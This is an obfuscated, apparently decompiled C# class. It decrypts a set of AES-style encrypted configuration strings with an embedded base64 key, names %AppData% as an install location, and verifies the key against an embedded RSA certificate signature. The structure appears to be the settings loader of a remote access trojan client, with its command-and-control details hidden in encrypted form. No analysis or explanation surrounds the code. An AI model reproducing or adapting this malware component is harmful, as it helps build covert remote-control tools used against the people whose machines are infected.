using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ns19;
using ns22;

namespace ns1;

public static class GClass10
{
	public static string string_0 = "n67SEqq3WXL+92ibM7zWGcVWHvi9zk+bYCOPrfwyY1wKIyyEBj+zq0hlUEco98PUE7xsrPxvlPzcEVyU5Cb4lINialHYHzj1wbi2klxZCDWAQnND+S/W8OrvlkdPbzPx";

	public static string string_1 = "0lxxDsXwq2VNxjqyyLq4Bz/zfudHsVtvynKr1Foi/gjLxpo+0pvgYsjvdoxcHXXSCufjDpU4EXTLwzS37n4C+Q==";

	public static string string_2 = "aXPC+hemU7XIIx6bZ3Q6H0Qovfei7Hi8sdrx+GNRiC7GAZKJb5cOGX74CmgDwxG209U+ejjyNvpgZoWq6ONr7Q==";

	public static string string_3 = "Bcw/4K/L9/BJsL/00ypwiBz2Lb5KA/JcSbJkpEK+z5oBC6PyVrDrTxuMqzrOHzg10Wjpf0qjVjf1gPV6aAMqkA==";

	public static string string_4 = "HeaZsFju3KsTaRLJo1KLyj+5WbLuue9ruOhEfrNr6Gu2sYMd5ZZf4a8voZ3gmrJec5AqIVsrYfLrOiyflKkS7g==";

	public static string string_5 = "kEFz5eROb4Kopkrc5Kg5XlQw+pubKM4cFkB9qdZNj7M4vtqIC2ss0jqiqD2ewYL6MpxgikyfCEY13jAor9UVjg==";

	public static string string_6 = "%AppData%";

	public static string string_7 = "";

	public static string string_8 = "WWlpQ2Q1Qzdmc01zajFWYWtpYTJMN3hacllxTjRSczY=";

	public static string string_9 = "wkIVzDKEleMFdsX6zZGvPM74OlbavaXi7GPCfcY1b14vqEo4teBF+Tco67SA4xOM54E6g+EvCKE42zG9G3RsVIIET0rnUk7qmrEt/DZCNKw=";

	public static string string_10 = "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";

	public static string string_11 = "SidnNOCuPkwmXjZvZfrdlWq2J5PfSQ8hc/PBU5MC+B5UrwUuK4aan+etkbv05sBxgBRzKxjd8CwcL3BRoDYGXYHbChmDQCmBm7jHiwYT2o/UnQqfrjYyzUqdeEc3UPcwdgr1e9KjM9n+nTFQSkwXLWl4KO5u66p4j/JIkp6JOyhQIcut7iVoORw6cRvjqFcDn42o1bTP9+fZuy1MVdRPrwEVjvQWN6s9Z2J6kutvxPyy6Hb8QMvyV11PrWjnoDbZHBu3KTyOvFR5hRQmjMnyOk7EBOMhZnQd/SEwFxGVep3NQtUPmYtDobTYB3e5E+Hrdc+eYiwodlkwV6sYJgOyEGyRrg1E3eXGXfhpurwNuM3F0lqLCIpejA1fR3p1rxHUtzRi1cbS+GuosircTCoJQ/EZ/ObA3sBgPmxWj2Oi4nlQQffgmeHAYgju70VmoTy6LqypeIuZxbXPAYxXYvSOFjeoNYi7wuBw7uTL2WKtg6xEICVfwiYrN/SM190Lq7WLsrs0QoFpJ+Xc8iGpmXqTAAI3Jz6iSPxKQG6YSc9sj+15vquX9+A9s4ClFW43mOALms03nFEAcyjkkclGIClWqldKQSsAdtZI8Oqc9HmbGJ15Mat3QlODHGg60Iuhw3kE9igEwn8B7NuFn7CirGvR8b/COnbeUSSwIrItmgZQ9wXsN2eozYqGNzdZXXEmJ9JjVjvj+5U1Go8GGE7wbLBB/nu1BR/YYeuIfSvuo3kr4YHQNIhmoMvwa75b+5JksrpR1OsFuSbLEgLpQKuSwfYl/LNo7pg5AUePueENhrbg3MH9Dn2d6OunkDd1zuRLRPzumgHEh0ywt8ZoGQPm0ZP7+HxrMIYn5249pyNuvLQozj193B8s/Gg2g/BGzpX+HxJI1L1etnjATIM2yfMhzTP/h7EmjPPCLrvPpjkbPNM/3ZXVCZWFYi824rE3BUvzzWjihRbGbDujoexAK6UiUFKZZQ==";

	public static X509Certificate2 x509Certificate2_0;

	public static string string_12 = "Qj40ncPJzdRQ+NlNyRAZg+/22zxGJjWpElFAByWDw8u2GCt8NuwT+FAIyv1HSJZsNuWwMPgg5Pw9xEhu11bAJg==";

	public static GClass29 gclass29_0;

	public static string string_13 = "/VcRWr9bRP2JL2qevaDpWmVlUVMjcnKGvBa2wRM0PY7yFxU7EfDKq92RQg8Vbwc6FdRtLIVw6HgndpNebv7S7w==";

	public static string string_14 = "lRrhib4siBYW3tqzylhXYnnJhrzMSC7SqdW96CUdEgrg/dkAcPnV+AtaWdoxsE9NsM0LVVbnXYu0pGkMOOC+SQ==";

	public static string string_15 = null;

	public static string string_16 = "3";

	public static string string_17 = "LSuxkX+1t/2p17tC5Isv4mqrG6ymHdyqBlbzNU+MoigpenRi58u+4+7SSFMPeeiBun0Qa6RH2K2dU4FhcaDj5w==";

	public static bool smethod_0()
	{
		try
		{
			string_8 = Encoding.UTF8.GetString(Convert.FromBase64String(string_8));
			gclass29_0 = new GClass29(string_8);
			string_0 = gclass29_0.method_2(string_0);
			string_1 = gclass29_0.method_2(string_1);
			string_2 = gclass29_0.method_2(string_2);
			string_3 = gclass29_0.method_2(string_3);
			string_4 = gclass29_0.method_2(string_4);
			string_5 = gclass29_0.method_2(string_5);
			string_9 = gclass29_0.method_2(string_9);
			string_13 = gclass29_0.method_2(string_13);
			string_12 = gclass29_0.method_2(string_12);
			string_14 = gclass29_0.method_2(string_14);
			string_17 = gclass29_0.method_2(string_17);
			string_15 = GClass20.smethod_0();
			string_11 = gclass29_0.method_2(string_11);
			x509Certificate2_0 = new X509Certificate2(Convert.FromBase64String(gclass29_0.method_2(string_10)));
			return smethod_1();
		}
		catch
		{
			return false;
		}
	}

	private static bool smethod_1()
	{
		try
		{
			return ((RSACryptoServiceProvider)x509Certificate2_0.PublicKey.Key).VerifyHash(GClass30.smethod_1(Encoding.UTF8.GetBytes(string_8)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(string_11));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
